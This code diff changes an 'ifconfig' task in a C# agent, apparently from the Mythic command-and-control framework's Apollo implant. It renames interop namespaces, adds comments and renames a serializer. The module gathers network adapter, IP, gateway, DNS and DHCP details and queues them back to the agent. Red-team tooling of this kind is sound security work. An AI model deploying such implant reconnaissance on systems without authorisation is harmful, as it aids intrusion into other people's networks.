@@ -6,9 +6,9 @@
 
 #if IFCONFIG
 
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Net;
@@ -78,14 +78,14 @@ namespace Tasks
                     Gateways = new List<string>()
                 };
                                         
-                
+                // Interface Properties
                 IPInterfaceProperties properties = adapter.GetIPProperties();
                 interfaceData.Description = adapter.Description;
                 interfaceData.AdapterName = adapter.Name;
                 interfaceData.AdapterId = adapter.Id;
                 interfaceData.Status = adapter.OperationalStatus.ToString();
 
-                
+                // IP address 
                 UnicastIPAddressInformationCollection uniCast = properties.UnicastAddresses;
                 if (uniCast.Count > 0) {
                     foreach (UnicastIPAddressInformation uni in uniCast) {
@@ -96,11 +96,11 @@ namespace Tasks
                     }
                 }
                 
-                
+                // Gateway 
                 foreach (GatewayIPAddressInformation gateway in properties.GatewayAddresses)
                     interfaceData.Gateways.Add(gateway.Address.ToString());
 
-                
+                // DNS
                 IPAddressCollection dnsServers = properties.DnsAddresses;
                 if (dnsServers.Count > 0) {
                     foreach (IPAddress dns in dnsServers)
@@ -113,7 +113,7 @@ namespace Tasks
                     interfaceData.DynamicDnsEnabled = properties.IsDynamicDnsEnabled.ToString();
                 }
 
-                
+                // DHCP 
                 IPAddressCollection dhcp = properties.DhcpServerAddresses;
                 if (dhcp.Count > 0) {
                     foreach (IPAddress address in dhcp) {
@@ -127,7 +127,7 @@ namespace Tasks
 
             _agent.GetTaskManager().AddTaskResponseToQueue(
                 CreateTaskResponse(
-                    _dataSerializer.Serialize(_interfaces),
+                    _jsonSerializer.Serialize(_interfaces),
                     true,
                     ""));
         }
